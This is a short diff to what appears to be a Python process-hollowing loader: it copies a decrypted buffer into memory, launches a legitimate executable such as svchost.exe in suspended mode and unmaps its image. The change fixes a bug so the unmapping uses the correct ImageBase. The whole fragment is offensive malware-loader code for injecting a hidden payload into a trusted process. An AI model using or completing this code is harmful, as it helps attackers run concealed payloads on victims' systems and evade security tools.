@@ -118,6 +118,7 @@ p = calloc((fd_size+1), ctypes.sizeof(ctypes.c_char))
 ctypes.memmove(p, decryptedbuff, fd_size)
 
 print "[+] Pointer : "+str(hex(p))
+pefilepath = pefile.PE(filepath)
 
 # Create new process in suspedend mode using a legitim executable (Ex. svchost.exe)
 if ctypes.windll.kernel32.CreateProcessA(None, filepath, None, None, False, CREATE_SUSPENDED, None, None, ctypes.byref(si), ctypes.byref(pi)):
@@ -129,7 +130,7 @@ else:
 	sys.exit(1)
 
 # Unmap the view of sections of the new process created
-if ctypes.windll.ntdll.NtUnmapViewOfSection(pi.hProcess, LPSTR(pe.OPTIONAL_HEADER.ImageBase)):
+if ctypes.windll.ntdll.NtUnmapViewOfSection(pi.hProcess, LPSTR(pefilepath.OPTIONAL_HEADER.ImageBase)):
 	print "[+] Unmap View Of Section Succeed"
 else:
 	print "Failed to unmap the original exe"
